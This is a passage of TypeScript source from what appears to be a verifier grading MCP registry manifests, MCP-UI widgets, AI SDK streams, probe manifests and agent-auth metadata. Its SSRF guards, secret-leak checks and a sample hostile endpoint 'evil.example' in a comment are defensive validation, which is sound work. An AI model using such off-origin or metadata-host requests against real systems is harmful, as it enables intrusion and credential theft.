      'declared MCP remote resolves live (initialize → tools/list advertises tools)', undefined,
      [ROLE.mcpServerJson, ROLE.mcpRemoteInit, ROLE.mcpRemoteToolsList],
      judgeMcpRemoteLive(sjEv, server, initEv, toolsEv)))

    // (c) DNS-challenge / well-known ownership provability, and (d)
    //     registry-presence — presence is needed by BOTH (c), as the sole
    //     out-of-band proof for a GitHub-account-backed io.github namespace,
    //     and (d)'s own informational report, so resolve it once, first.
    const authEv = findEvidence(bundle, ROLE.mcpRegistryAuthWellKnown)
    const dnsEv = findEvidence(bundle, ROLE.mcpRegistryDnsTxt)
    const presenceEv = findEvidence(bundle, ROLE.mcpRegistryPresence)
    checks.push(check('mcp-registry-ownership',
      'domain/account can prove ownership to publish under its reverse-DNS namespace', undefined,
      [ROLE.mcpServerJson, ROLE.mcpRegistryAuthWellKnown, ROLE.mcpRegistryDnsTxt, ROLE.mcpRegistryPresence],
      judgeRegistryOwnership(sjEv, server, authEv, dnsEv, presenceEv)))

    // (d) OPTIONAL/informational — actual presence in the official registry.
    //     NEVER fails (pass when found, skip otherwise) — it does not gate the
    //     grade: publishability is graded from the target's own surfaces.
    checks.push(check('mcp-registry-presence',
      'server is present in the official MCP registry (informational)', undefined,
      [ROLE.mcpServerJson, ROLE.mcpRegistryPresence],
      judgeRegistryPresence(sjEv, server, presenceEv)))
  }

  // ── MCP-UI / streaming-component readiness (ax-odg, ADR-0022) ─────────────
  //    "Renders trustworthily inside an agent host (ChatGPT/Claude/Goose/VS
  //    Code)" made a gradeable claim — the trust primitive as the ecosystem
  //    floods with unverified third-party widgets. This is an ADDITIVE readiness
  //    dimension (every sub-check axItem undefined): a target with NO MCP-UI
  //    (no tool advertises a `ui://` template) informationally SKIPs every
  //    sub-check and is NEVER over-blocked — a non-MCP-UI API is unaffected.
  //    A target that DECLARES MCP-UI but violates a sub-signal (broken/wrong-MIME
  //    resource, remote code in the srcDoc, a secret leaked into a model-visible
  //    channel, register divergence, no first-render tolerance) FAILs — an
  //    honesty cap that grades the surface DOWN (a leaky/broken widget is worse
  //    than none). DERIVED entirely from the target's published MCP surface.
  {
    const toolsEv = findEvidence(bundle, ROLE.mcpRemoteToolsList)
    const callEv = findEvidence(bundle, ROLE.mcpUiToolsCall)
    const readEv = findEvidence(bundle, ROLE.mcpUiResourceRead)
    const extEv = findEvidence(bundle, ROLE.mcpUiExternalUrl)
    const ui = buildMcpUiContext(toolsEv, callEv, readEv, extEv)

    const uiEvidence = [ROLE.mcpRemoteToolsList, ROLE.mcpUiToolsCall, ROLE.mcpUiResourceRead, ROLE.mcpUiExternalUrl]

    // (1) resource linkage + MIME
    checks.push(check('mcp-ui-resource-linkage',
      'MCP-UI tool result links a ui:// resource served with an MCP-Apps MIME', undefined,
      uiEvidence, judgeMcpUiLinkage(ui)))

    // (2) srcDoc self-containment + closed CSP
    checks.push(check('mcp-ui-self-contained',
      'ui:// srcDoc is self-contained (no remote code) and CSP-safe', undefined,
      uiEvidence, judgeMcpUiSelfContained(ui)))

    // (3) envelope hygiene — no secret in a model-visible channel (HIGH)
    checks.push(check('mcp-ui-envelope-hygiene',
      'no secret leaks into a model-visible channel (content/structuredContent)', undefined,
      uiEvidence, judgeMcpUiEnvelopeHygiene(ui)))

    // (4) three-register parity
    checks.push(check('mcp-ui-register-parity',
      'widget structuredContent is consistent with the agent/API register (no divergence)', undefined,
      uiEvidence, judgeMcpUiRegisterParity(ui)))

    // (5) host-render readiness
    checks.push(check('mcp-ui-host-render',
      'first-render-without-input tolerance + tool annotations / widgetDescription present', undefined,
      uiEvidence, judgeMcpUiHostRender(ui)))
  }

  // ── AI SDK 5 UI-message-stream readiness (ax-rx1) ─────────────────────────
  //    The analog of the mcp-ui-* dimension for the streaming (SSE) face: an
  //    agent host consumes the target's AI SDK 5 UI-message-stream over
  //    text/event-stream, and a malformed / mis-shaped / secret-leaking /
  //    register-divergent stream renders WRONG (or exfiltrates a credential)
  //    inside that host. ENFORCEMENT-FIRST + TARGET-DECLARED: a target that
  //    exposes NO UI-message-stream face (no `interfaces.uiMessageStream`, so no
  //    stream evidence was recorded) informationally SKIPs every sub-check and
  //    is NEVER over-blocked. A target that DECLARES the face but violates a
  //    sub-signal — bad/missing header, broken SSE framing, a wrong part shape,
  //    a secret in a part, or a projection-parity divergence — FAILs (an honesty
  //    cap: a broken/leaky stream is worse than none). Every sub-check axItem is
  //    undefined (additive readiness dimension). DERIVED entirely from the
  //    observed stream body + declared JSON twin.
  {
    const streamEv = findEvidence(bundle, ROLE.uiMessageStream)
    const twinEv = findEvidence(bundle, ROLE.uiStreamTwin)
    const us = buildUiStreamContext(streamEv, twinEv)
    const streamEvidence = [ROLE.uiMessageStream, ROLE.uiStreamTwin]

    // (1) transport: x-vercel-ai-ui-message-stream: v1 + content-type text/event-stream
    checks.push(check('ui-stream-transport',
      'UI-message-stream is served with the v1 stream header and an SSE content-type', undefined,
      streamEvidence, judgeUiStreamTransport(us)))

    // (2) SSE framing: data:{json}\n\n chunks, a bare data:[DONE] terminal, each payload JSON+type
    checks.push(check('ui-stream-framing',
      'SSE framing is valid — data:{json} chunks, a bare [DONE] terminal, each payload a typed JSON part', undefined,
      streamEvidence, judgeUiStreamFraming(us)))

    // (3) part shapes: every part spec-correct per AI SDK 5 (known type + required fields)
    checks.push(check('ui-stream-part-shapes',
      'every UI-message-stream part is spec-correct (known type, required fields present)', undefined,
      streamEvidence, judgeUiStreamPartShapes(us)))

    // (4) envelope hygiene: no secret leaks into any part (reuses the shared detector)
    checks.push(check('ui-stream-envelope-hygiene',
      'no secret leaks into any UI-message-stream part (token/key in a part → FAIL)', undefined,
      streamEvidence, judgeUiStreamEnvelopeHygiene(us)))

    // (5) projection-parity: tool-output-available output is consistent with the JSON/MCP twin
    checks.push(check('ui-stream-parity',
      "tool-output-available `output` is byte/JSON-consistent with the JSON twin (no divergence)", undefined,
      streamEvidence, judgeUiStreamParity(us)))
  }

  // ── Probe-manifest validity (grade-neutral for targets that declare none) ─
  {
    // The manifest is ADVERSARIAL input: a pinned standard that resolves its
    // behavioral probes from the target's own card must first hold the card to
    // the manifest rules — same-origin, GET-only, addressing only operations
    // the contract itself publishes, required channels present and disjoint.
    // Targets without a manifest SKIP (generic grading unaffected); a pinned
    // `must:'pass'` requirement turns that skip into a fail-closed gate.
    const manifest = agents.probes
    if (!manifest) {
      checks.push(check('probe-manifest', 'card-declared probe manifest is valid', undefined, [ROLE.agentsJson],
        { verdict: 'skip', detail: 'no probe manifest declared (agents.json top-level `probes`) — nothing to validate' }))
    } else {
      const origin = bundle.target
      const problems: string[] = []
      // Paths the target's own contract declares — a probe may only address these.
      const declaredPaths = new Set<string>()
      const rawPaths = openapiDoc && typeof openapiDoc === 'object'
        ? ((openapiDoc as Record<string, unknown>).paths as Record<string, unknown> | undefined)
        : undefined
      if (rawPaths && typeof rawPaths === 'object') {
        for (const p of Object.keys(rawPaths)) if (!p.includes('{')) declaredPaths.add(p)
      }
      for (const e of agents.endpoints) {
        try {
          const u = new URL(e.url)
          if (u.origin === origin) declaredPaths.add(u.pathname)
        } catch { /* unparseable claimed url — contributes no declared path */ }
      }

      // Distinctness is judged on the FETCHED identity of the URL: fragments
      // are stripped before requests, so `/e?a=1` and `/e?a=1#dup` are ONE
      // probe, not two.
      const urlKey = (raw: string) => {
        try { const u = new URL(raw); u.hash = ''; return u.toString() } catch { return raw }
      }
      const dedupe = (a: Array<{ method: string; url: string; param?: string }>) =>
        [...new Map(a.map((p) => [urlKey(p.url), p])).values()]
      const required: Array<[string, number]> = [
        ['keyless', 1], ['pricing', 1], ['overCeiling', 1], ['knownEmpty', 2], ['knownForbidden', 2],
      ]
      const deduped: Record<string, Array<{ method: string; url: string; param?: string }>> = {}
      for (const [ch, entries] of Object.entries(manifest)) deduped[ch] = dedupe(entries)
      for (const [ch, min] of required) {
        const n = deduped[ch]?.length ?? 0
        if (n < min) problems.push(`probes.${ch} declares ${n} distinct probe(s); at least ${min} required`)
      }
      for (const [ch, entries] of Object.entries(deduped)) {
        for (const e of entries) {
          let u: URL | undefined
          try { u = new URL(e.url) } catch { /* fallthrough */ }
          // SHARED same-origin gate — identical to monetization.probe (AXP A.5)
          // so the two can never drift; also rejects private/metadata hosts.
          if (!u || !isPubliclyRoutableSameOrigin(e.url, origin)) { problems.push(`probes.${ch} url ${e.url} is not a same-origin, publicly-routable target for ${origin}`); continue }
          if (e.method !== 'GET') problems.push(`probes.${ch} ${e.url} uses method ${e.method} — probe manifests are GET-only`)
          if (!declaredPaths.has(u.pathname)) {
            problems.push(`probes.${ch} path ${u.pathname} is not an operation declared in the OpenAPI contract or interfaces.http`)
          }
        }
      }
      const emptyUrls = new Set((deduped.knownEmpty ?? []).map((e) => urlKey(e.url)))
      const overlap = (deduped.knownForbidden ?? []).filter((e) => emptyUrls.has(urlKey(e.url)))
      if (overlap.length > 0) {
        problems.push(`probes.knownEmpty and probes.knownForbidden share URL(s): ${overlap.map((e) => e.url).join(', ')}`)
      }
      for (const e of deduped.overCeiling ?? []) {
        if (typeof e.param !== 'string' || e.param.length === 0) {
          problems.push(`probes.overCeiling ${e.url} carries no non-empty "param" (the spend query-parameter name)`)
        }
      }
      // A card that invites pinned probing must also declare its 402-offer
      // boundary (monetization.probe), so the structured-offer obligation is
      // behaviorally verified — never satisfiable by declaration alone.
      if (!agents.offerProbe) {
        problems.push('card declares a probe manifest but no monetization.probe URL — the 402 offer boundary cannot be behaviorally verified')
      }
      checks.push(check('probe-manifest', 'card-declared probe manifest is valid', undefined, [ROLE.agentsJson, ROLE.openapi],
        problems.length === 0
          ? pass('probe manifest declares every required channel; all entries same-origin GET on contract-declared paths')
          : { verdict: 'fail', detail: problems.slice(0, 8).join('; ') }))
    }
  }

  return checks
}

// ---------------------------------------------------------------------------

function ok(ev: Evidence | undefined): boolean {
  return !!ev && ev.status !== null && ev.status >= 200 && ev.status < 300
}

function originOf(url: string): string {
  try { return new URL(url).origin } catch { return url }
}

/**
 * True only for a NON-EMPTY absolute https URL. Presence-of-a-string is not
 * enough for RFC 8414 members (issuer / authorization_endpoint / token_endpoint)
 * or the RFC 7591 registration_endpoint: the empty string and non-URL junk are
 * `typeof 'string'` yet inflate the grade. Parsed with new URL(), the same
 * strictness mcp-oauth-resource-indicators already applies to `resource`.
 */
function isAbsoluteHttpsUrl(v: unknown): boolean {
  if (typeof v !== 'string' || v.length === 0) return false
  try { return new URL(v).protocol === 'https:' } catch { return false }
}

/**
 * Resolve a possibly-RELATIVE endpoint against a base URL and return the result
 * only when it is https. Per AAP v1.0-draft the reference provider (id.org.ai
 * worker/routes/aap.ts) emits RELATIVE endpoint paths ('/agent/register',
 * '/agent/status', '/agent/revoke'); resolved against the doc's issuer they
 * yield the provider's own https origin. A non-string, an empty string, an
 * unresolvable value (relative with no valid base), or a non-https result all
 * yield undefined. Same-origin restriction, when required, is applied by the
 * caller against the returned URL's origin.
 */
function resolveHttpsUrl(value: unknown, base: string | undefined): URL | undefined {
  // A whitespace-only value must NOT count: the URL parser strips surrounding
  // whitespace, so '   ' would otherwise resolve to the base origin root and
  // inflate the grade. Reject the empty/whitespace case before resolving.
  if (typeof value !== 'string' || value.trim().length === 0) return undefined
  let u: URL
  try { u = base !== undefined ? new URL(value, base) : new URL(value) } catch { return undefined }
  return u.protocol === 'https:' ? u : undefined
}

/**
 * A non-empty TRIMMED string (the floor for AAP required string members). A
 * whitespace-only value ("   ") is `typeof 'string'` yet carries no advertised
 * identity/version/name — it must not inflate the grade, so it is rejected.
 */
function isNonEmptyString(v: unknown): v is string {
  return typeof v === 'string' && v.trim().length > 0
}

// The two ways an authorization server advertises ID-JAG as its accepted
// assertion: the RFC token-exchange subject token type urn, or the SET/JWT
// `typ`. Either value appearing in a field that SEMANTICALLY carries accepted
// subject-token / assertion types is the advertisement (advertisement-grade —
// no live mint).
const IDJAG_TOKEN_TYPE = 'urn:ietf:params:oauth:token-type:id-jag'
const IDJAG_TYP = 'oauth-id-jag+jwt'

// The ONLY fields whose values semantically declare an accepted subject-token /
// assertion type. Scanning every pooled string (issuer, provider_name, an
// unrelated scope, …) would let the urn appearing in an irrelevant field
// falsely count as advertising ID-JAG — so the scan is scoped to these keys.
const IDJAG_AS_KEYS = ['subject_token_types_supported'] as const
const IDJAG_AGENT_AUTH_KEYS = [
  'subject_token_types',
  'subject_token_types_supported',
  'accepted_assertion_types',
  'assertion_types',
] as const

/**
 * True when the AS metadata or its agent_auth block advertises ID-JAG — an
 * EXACT-value scan restricted to the accepted-subject-token / assertion-type
 * fields (RFC 8693 subject_token_types_supported on the AS; the designated
 * agent_auth subject-token / assertion keys). The urn or `oauth-id-jag+jwt` typ
 * appearing in ANY OTHER field (issuer, provider_name, a scope) does NOT satisfy
 * the requirement — declaring the value in a type field IS the advertisement.
 */
function advertisesIdJag(asMeta: unknown, agentAuthRaw: Record<string, unknown>): boolean {
  const pool: unknown[] = []
  const collectKeys = (o: unknown, keys: readonly string[]): void => {
    if (!o || typeof o !== 'object') return
    const rec = o as Record<string, unknown>
    for (const key of keys) {
      const v = rec[key]
      if (typeof v === 'string') pool.push(v)
      else if (Array.isArray(v)) for (const e of v) if (typeof e === 'string') pool.push(e)
    }
  }
  collectKeys(asMeta, IDJAG_AS_KEYS)
  collectKeys(agentAuthRaw, IDJAG_AGENT_AUTH_KEYS)
  return pool.some((v) => v === IDJAG_TOKEN_TYPE || v === IDJAG_TYP)
}

/**
 * Judge the AAP discovery document (pure). The doc must advertise, per AAP
 * v1.0-draft (id.org.ai worker/routes/aap.ts:39-82): version + issuer +
 * provider_name (non-empty strings); an algorithms array including 'Ed25519';
 * a non-empty approval_methods array (enum device_authorization | ciba, custom
 * values tolerated); an endpoints object whose register/status/revoke are
 * non-null strings; and a non-empty jwks_uri. Any missing/malformed required
 * field FAILS with an evidence-cited detail.
 */
function judgeAapDiscovery(doc: unknown): { verdict: Verdict; detail: string } {
  if (!doc || typeof doc !== 'object' || Array.isArray(doc)) {
    return { verdict: 'fail', detail: '/.well-known/agent-configuration returned 200 but the body is not a JSON object' }
  }
  const d = doc as Record<string, unknown>
  const problems: string[] = []
  for (const key of ['version', 'issuer', 'provider_name'] as const) {
    if (!isNonEmptyString(d[key])) problems.push(`${key} is missing or not a non-empty string`)
  }
  const algs = Array.isArray(d.algorithms) ? d.algorithms : []
  if (!algs.includes('Ed25519')) {
    problems.push(`algorithms ${algs.length ? `[${algs.join(', ')}]` : 'missing/empty'} does not include 'Ed25519' (AAP requires Ed25519 key material)`)
  }
  // approval_methods must carry at least one USABLE method: a non-empty trimmed
  // STRING (enum device_authorization | ciba; custom string values tolerated). A
  // [null] / [""] / ["   "] / [123] / [{}] array is `length > 0` yet advertises
  // no method an agent can actually approve against — it must FAIL, not pass.
  const approvals = Array.isArray(d.approval_methods) ? d.approval_methods : undefined
  const usableApprovals = approvals?.filter((a) => typeof a === 'string' && a.trim().length > 0) ?? []
  if (usableApprovals.length === 0) {
    problems.push('approval_methods is missing, empty, or has no non-empty string element (expected device_authorization | ciba; custom string values tolerated, but null/whitespace/non-string junk is not a method an agent can approve against)')
  }
  // The reference AAP provider (id.org.ai) emits RELATIVE endpoint paths, per
  // AAP v1.0-draft. Resolve register/status/revoke against the doc's issuer
  // BEFORE validating, so a relative path is ACCEPTED and resolves to the issuer
  // origin. After resolution require https AND same-origin with the issuer:
  // these are the provider's OWN AAP surface, so an absolute off-origin endpoint
  // (https://evil.example/r) must FAIL. jwks_uri is resolved + https-required but
  // NOT same-origin-restricted (key material may be CDN/hosted on another host).
  const issuer = isNonEmptyString(d.issuer) ? d.issuer.trim() : undefined
  const issuerOrigin = issuer ? originOf(issuer) : undefined
  const endpoints = d.endpoints && typeof d.endpoints === 'object' && !Array.isArray(d.endpoints)
    ? (d.endpoints as Record<string, unknown>)
    : undefined
  if (!endpoints) {
    problems.push('endpoints object is missing')
  } else {
    for (const key of ['register', 'status', 'revoke'] as const) {
      const resolved = resolveHttpsUrl(endpoints[key], issuer)
      if (!resolved) {
        problems.push(`endpoints.${key} is missing or does not resolve to an https URL against the issuer (an agent cannot register/poll/revoke against a missing or non-https endpoint)`)
      } else if (!issuerOrigin || resolved.origin !== issuerOrigin) {
        problems.push(`endpoints.${key} ${resolved.href} does not resolve same-origin with the issuer ${issuerOrigin ?? '(missing issuer)'} (register/status/revoke are the provider's own AAP surface — an off-origin endpoint must not be advertised here)`)
      }
    }
  }
  if (!resolveHttpsUrl(d.jwks_uri, issuer)) problems.push('jwks_uri is missing or does not resolve to an https URL against the issuer (the jwt-verification key host must be https; a different host is allowed for CDN/hosted key material)')
  if (problems.length) return { verdict: 'fail', detail: `AAP discovery malformed: ${problems.slice(0, 8).join('; ')}` }
  return pass(`AAP discovery advertises version/issuer/provider_name, Ed25519, ${usableApprovals.length} approval method(s), register/status/revoke endpoints, and jwks_uri`)
}

/**
 * Judge the auth.md agent-identity advertisement (pure) over the RFC 8414 AS
 * metadata's `agent_auth` block plus the identity_endpoint probe evidence. The
 * identity_endpoint probe is METADATA-DERIVED and same-origin-with-AS gated in
 * observeTarget; a hostile (off-AS-origin / private) endpoint is refused
 * WITHOUT fetching, and this judge re-derives that refusal from the URL string
 * alone (the hostile URL is never requested), matching the MCP-OAuth posture.
 */
function judgeAuthmdAgentIdentity(
  agentAuth: { identity_endpoint?: string; claim_endpoint?: string; events_endpoint?: string; raw: Record<string, unknown>; defective?: boolean },
  asMeta: unknown,
  resolvedAsEv: Evidence | undefined,
  idEv: Evidence | undefined,
): { verdict: Verdict; detail: string } {
  // agent_auth key PRESENT but not a plain object (JSON array / string / number
  // / null) — the provider claims the block yet its shape carries no identity
  // advertisement. FAIL the defect rather than SKIP (which absence, handled by
  // the caller, correctly yields).
  if (agentAuth.defective) {
    return { verdict: 'fail', detail: 'auth.md agent-identity advertisement incomplete: agent_auth is present but is not a JSON object (an array/string/number/null carries no identity/claim/events endpoints, ID-JAG assertion, or SET-revocation advertisement)' }
  }
  const problems: string[] = []
  // (1) identity + claim endpoints must be non-empty absolute https URLs.
  for (const key of ['identity_endpoint', 'claim_endpoint'] as const) {
    if (!isAbsoluteHttpsUrl(agentAuth[key])) {
      problems.push(`agent_auth.${key} ${typeof agentAuth[key] === 'string' ? `"${agentAuth[key]}" is not a non-empty absolute https URL` : 'is missing'}`)
    }
  }
  // (4) SET-based revocation (RFC 8417/8935) is advertised via the events_endpoint
  //     — a non-empty absolute https URL IS the SET delivery endpoint.
  if (!isAbsoluteHttpsUrl(agentAuth.events_endpoint)) {
    problems.push(`agent_auth.events_endpoint ${typeof agentAuth.events_endpoint === 'string' ? `"${agentAuth.events_endpoint}" is not a non-empty absolute https URL` : 'is missing'} — SET-based revocation (RFC 8417/8935) delivery is not advertised`)
  }
  // (2) the declared identity_endpoint must RESOLVE. A hostile endpoint (off the
  //     delegating AS origin, or a private/metadata address) is refused WITHOUT
  //     fetching — re-derived here from the URL string, so no idEv exists.
  const idUrl = agentAuth.identity_endpoint
  if (isAbsoluteHttpsUrl(idUrl)) {
    const asOrigin = resolvedAsEv ? originOf(resolvedAsEv.url) : undefined
    if (asOrigin && !isPubliclyRoutableSameOrigin(idUrl!, asOrigin)) {
      problems.push(`agent_auth.identity_endpoint ${idUrl} is not same-origin with the delegating authorization server ${asOrigin} — refused without fetching (SSRF guard: a probed identity endpoint follows the AS delegation model, never a private/metadata host)`)
    } else if (!idEv || idEv.status === null || idEv.status === 404 || idEv.status >= 500) {
      const got = !idEv ? 'not fetched' : idEv.status === null ? `error ${idEv.error ?? 'unknown'}` : `status ${idEv.status}`
      problems.push(`agent_auth.identity_endpoint ${idUrl} did not resolve — got: ${got}`)
    }
  }
  // (3) ID-JAG advertised as the accepted assertion.
  if (!advertisesIdJag(asMeta, agentAuth.raw)) {
    problems.push(`ID-JAG assertion not advertised — neither the token type '${IDJAG_TOKEN_TYPE}' nor typ '${IDJAG_TYP}' appears in the AS metadata or agent_auth block`)
  }
  if (problems.length) return { verdict: 'fail', detail: `auth.md agent-identity advertisement incomplete: ${problems.slice(0, 8).join('; ')}` }
  return pass(`agent_auth advertises identity/claim/events endpoints, ID-JAG as the accepted assertion, and SET-based revocation (RFC 8417/8935) via events_endpoint ${agentAuth.events_endpoint}`)
}

/**
 * Why interfaces.mcp.url is inadmissible as a same-origin MCP endpoint — or
 * undefined if it is fine (or absent). The MCP endpoint is the target's OWN
 * resource server, so it MUST be same-origin with the verification target, the
 * identical gate every other card-derived probe passes (a mcpUrl off-origin or
 * at a private/metadata address is an SSRF vector). Pure string validation: the
 * hostile URL is NEVER fetched to decide.
 */
function mcpUrlSameOriginViolation(rawUrl: string | undefined, origin: string): string | undefined {
  if (typeof rawUrl !== 'string' || rawUrl.length === 0) return undefined
  let abs: string
  try { abs = new URL(rawUrl, origin).toString() } catch { return `interfaces.mcp.url ${rawUrl} is not a valid URL` }
  if (!isPubliclyRoutableSameOrigin(abs, origin)) {
    return `interfaces.mcp.url ${rawUrl} is not a same-origin, publicly-routable MCP endpoint for ${origin} — refused without fetching (SSRF guard: an MCP resource server MUST be same-origin with the target)`
  }
  return undefined
}

// ---------------------------------------------------------------------------
// MCP-registry publishability judges (pure) — ax-e6b.38
// ---------------------------------------------------------------------------

/**
 * The server.json publishability schema. `name` + `version` are the registry's
 * hard-required fields; `title`/`description`/`repository`/`websiteUrl`/`remotes`
 * are the registry-QUALITY bar this dimension holds a publishable listing to (a
 * bare name+version validates against the loose schema but is not a discoverable
 * listing). minLength/minItems reject the present-but-empty inflation
 * (`title: ""`, `remotes: []`) the way the MCP-OAuth members reject `''`.
 */
const SERVER_JSON_SCHEMA: MiniSchema = {
  type: 'object',
  required: ['name', 'version', 'title', 'description', 'repository', 'websiteUrl', 'remotes'],
  properties: {
    name: { type: 'string', minLength: 1 },
    version: { type: 'string', minLength: 1 },
    title: { type: 'string', minLength: 1 },
    description: { type: 'string', minLength: 1 },
    websiteUrl: { type: 'string', minLength: 1 },
    repository: {
      type: 'object',
      required: ['url'],
      properties: { url: { type: 'string', minLength: 1 }, source: { type: 'string' } },
    },
    remotes: {
      type: 'array',
      minItems: 1,
      items: {
        type: 'object',
        required: ['type', 'url'],
        properties: { type: { type: 'string', minLength: 1 }, url: { type: 'string', minLength: 1 } },
      },
    },
  },
}

/**
 * (a) server.json validity. ABSENT manifest (non-2xx / not fetched) => SKIP: the
 * target is not claiming MCP-registry publishability. A served-but-invalid
 * manifest FAILs (and, as an honesty check, caps the grade) — a listing that
 * claims to be registry-publishable but is not, is a lying surface.
 */
function judgeServerJson(sjEv: Evidence | undefined, server: ServerJsonClaims | undefined): { verdict: Verdict; detail: string } {
  if (!ok(sjEv)) {
    return { verdict: 'skip', detail: 'no server.json manifest served at the well-known/declared path — target is not claiming MCP-registry publishability' }
  }
  if (!server) {
    return { verdict: 'fail', detail: 'server.json was served (2xx) but is not a valid JSON object' }
  }
  const violations = validateSchema(server.raw, SERVER_JSON_SCHEMA).map((v) => `${v.path} ${v.message}`)
  // Reverse-DNS namespace shape of `name` (io.github.owner/server, com.example/server).
  if (typeof server.name === 'string' && server.name.length > 0 && !parseReverseDnsName(server.name)) {
    violations.push(`name "${server.name}" is not a valid reverse-DNS namespace (expected e.g. io.github.owner/server or com.example/server)`)
  }
  // Remote transport values, when present, must be a known registry transport.
  for (const r of server.remotes) {
    if (r.type !== undefined && r.type !== 'streamable-http' && r.type !== 'sse') {
      violations.push(`remotes[].type "${r.type}" is not a registry transport (expected streamable-http | sse)`)
    }
  }
  if (violations.length) {
    return { verdict: 'fail', detail: `server.json is not registry-publishable: ${violations.slice(0, 6).join('; ')}` }
  }
  return pass(`server.json valid: name="${server.name}" v${server.version}, ${server.remotes.length} remote(s), repository + websiteUrl present`)
}

/**
 * Parse a JSON-RPC message out of an MCP handshake Evidence body, tolerating
 * BOTH a plain `application/json` response and an SSE (`text/event-stream`)
 * framing where the JSON rides on `data:` lines. Returns the parsed message
 * object, or undefined.
 */
function parseMcpMessage(ev: Evidence | undefined): Record<string, unknown> | undefined {
  if (!ev || ev.body === null) return undefined
  const body = ev.body
  // Plain JSON first.
  try {
    const parsed = JSON.parse(body)
    if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) return parsed as Record<string, unknown>
  } catch { /* fall through to SSE parsing */ }
  // SSE: take the LAST `data:` payload that parses as a JSON object.
  let found: Record<string, unknown> | undefined
  for (const line of body.split(/\r?\n/)) {
    const m = /^data:\s?(.*)$/.exec(line)
    if (!m || !m[1]) continue
    try {
      const parsed = JSON.parse(m[1])
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) found = parsed as Record<string, unknown>
    } catch { /* ignore non-JSON data lines */ }
  }
  return found
}

/** The `result.tools[]` (each tool's `name`) advertised by a tools/list message. */
function toolsFrom(message: Record<string, unknown> | undefined): string[] {
  const result = message?.result
  if (!result || typeof result !== 'object') return []
  const tools = (result as Record<string, unknown>).tools
  if (!Array.isArray(tools)) return []
  return tools
    .map((t) => (t && typeof t === 'object' ? (t as Record<string, unknown>).name : undefined))
    .filter((n): n is string => typeof n === 'string' && n.length > 0)
}

/**
 * (b) LIVE MCP remote resolution — the upgrade from AX-6 presence-only. ABSENT
 * server.json => SKIP. A server.json with NO http remote (packages-only) => SKIP
 * (still registry-publishable, just nothing live to resolve). A declared remote
 * is graded on the recorded initialize/tools-list handshake:
 *   - initialize 401/403        => PASS (reachable + auth-protected, not dead)
 *   - initialize 2xx + tools    => PASS (genuinely resolves and advertises tools)
 *   - initialize 2xx, no tools  => FAIL (resolves but advertises nothing)
 *   - unreachable / 3xx / 4xx / 5xx / SSRF-refused => FAIL (declared-but-dead)
 */
function judgeMcpRemoteLive(
  sjEv: Evidence | undefined,
  server: ServerJsonClaims | undefined,
  initEv: Evidence | undefined,
  toolsEv: Evidence | undefined,
): { verdict: Verdict; detail: string } {
  if (!ok(sjEv) || !server) {
    return { verdict: 'skip', detail: 'no server.json manifest — no registry remote to resolve' }
  }
  const remote = server.remotes.find((r) => typeof r.url === 'string' && r.url.length > 0)
  if (!remote?.url) {
    return { verdict: 'skip', detail: 'server.json declares no http remote (packages-only listing) — no live remote to resolve' }
  }
  // SSRF re-derivation from the URL string (the hostile remote is never fetched,
  // so no initEv exists): the remote must be https + public + non-private.
  if (!isPublicHttpsOffOriginAllowed(remote.url)) {
    return { verdict: 'fail', detail: `server.json remote url ${remote.url} is not a public https endpoint (no cleartext, no private/metadata host) — refused without fetching (SSRF guard)` }
  }
  if (!initEv || initEv.status === null) {
    return { verdict: 'fail', detail: `declared MCP remote ${remote.url} is unreachable: ${initEv?.error ?? 'no initialize response'}` }
  }
  const status = initEv.status
  if (status === 401 || status === 403) {
    return pass(`remote ${remote.url} is reachable and auth-protected (HTTP ${status}) — a live, protected MCP endpoint (reachable+protected, not dead)`)
  }
  if (status < 200 || status >= 300) {
    const kind = status >= 300 && status < 400 ? 'a redirect (not followed)' : `HTTP ${status}`
    return { verdict: 'fail', detail: `declared MCP remote ${remote.url} did not resolve — initialize returned ${kind}` }
  }
  // initialize resolved 2xx — require tools/list to advertise ≥1 tool.
  const initMsg = parseMcpMessage(initEv)
  if (initMsg?.error) {
    return { verdict: 'fail', detail: `declared MCP remote ${remote.url} returned a JSON-RPC error on initialize — not a resolvable MCP endpoint` }
  }
  const tools = toolsFrom(parseMcpMessage(toolsEv))
  if (tools.length === 0) {
    return { verdict: 'fail', detail: `MCP remote ${remote.url} resolved (initialize 2xx) but tools/list advertised no tools — a live MCP server must expose at least one tool` }
  }
  return pass(`live remote ${remote.url} resolved: initialize ok, tools/list advertises ${tools.length} tool(s) [${tools.slice(0, 8).join(', ')}]`)
}

/** True when a DoH TXT response or a well-known body carries the MCPv1 proof. */
function carriesMcpv1Proof(body: string | null | undefined): boolean {
  return typeof body === 'string' && /v=MCPv1/i.test(body)
}

/** The lowercased hostname a piece of Evidence was actually fetched from, or undefined. */
function evidenceHostname(ev: Evidence | undefined): string | undefined {
  if (!ev) return undefined
  try { return new URL(ev.url).hostname.toLowerCase() } catch { return undefined }
}

/**
 * True when the exact server.json `name` appears in a parsed official-registry
 * response — the ONE out-of-band binding this verifier can check for the
 * GitHub-account-backed `io.github.<owner>` namespace (the registry mints those
 * names only after a GitHub OIDC exchange, so registry PRESENCE under the exact
 * name is a real third-party attestation, unlike anything the target's own
 * manifest can assert about itself).
 */
function provenByRegistryPresence(server: ServerJsonClaims, presenceEv: Evidence | undefined): boolean {
  if (!ok(presenceEv) || presenceEv?.body == null || typeof server.name !== 'string') return false
  try {
    return registryDocMentions(JSON.parse(presenceEv.body), server.name)
  } catch {
    return false
  }
}

/**
 * (c) Ownership provability. ABSENT server.json => SKIP. A proof must VERIFY
 * THE THING IT CLAIMS TO PROVE, bound to the right principal — never a
 * self-asserted claim, never the wrong domain:
 *
 *   - Custom-domain namespace (com.example/server ⇒ domain example.com): the
 *     proof MUST be bound to `example.com` — a DNS-TXT (v=MCPv1) resolved via
 *     the fixed DoH resolver for that domain, OR a /.well-known/mcp-registry-
 *     auth HTTPS proof FETCHED AT that domain (discovery.ts fetches it there,
 *     never at the scanned origin — see observeMcpRegistry). This function
 *     additionally re-checks the fetched well-known's own URL hostname against
 *     the namespace domain as defense in depth: even if a future call site
 *     regressed to fetching off-domain, a mismatched hostname is NEVER honored
 *     here. Neither proof carries a defined signature CHALLENGE to verify
 *     cryptographically (the `k=`/`p=` fields are informational metadata, not
 *     a signature over any nonce this verifier issues) — so the security
 *     boundary is DOMAIN-BINDING itself (control of DNS / HTTPS hosting at the
 *     claimed domain, the same trust model as an ACME HTTP-01 / DNS-01
 *     challenge), not a signature match. This is stated here explicitly rather
 *     than silently assumed.
